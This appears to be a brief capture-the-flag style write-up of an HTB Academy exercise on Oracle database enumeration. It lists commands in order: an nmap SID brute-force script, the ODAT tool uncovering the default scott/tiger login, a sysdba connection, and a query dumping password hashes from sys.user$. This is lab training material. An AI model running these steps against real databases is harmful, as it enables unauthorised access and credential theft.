1. Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

In this case the hash can be found by simply repeating the steps on the page, which is effectively a walkthrough, this is as easy as it gets for HTB Academy exercises. 
Even the username/password of scott/tiger that can be used to escelate privleges of the SQL database is the same as shown in the walkthrough.

` sudo nmap -p1521 -sV <ADDRESS> --open --script oracle-sid-brute  : Returns XE as the SID. 
` ./odat.py all -s <ADDRESS> : The credentials are discovered this way. scott/tiger
` sqlplus scott/tiger@10.129.204.235/XE as sysdba
` select name, password from sys.user$;
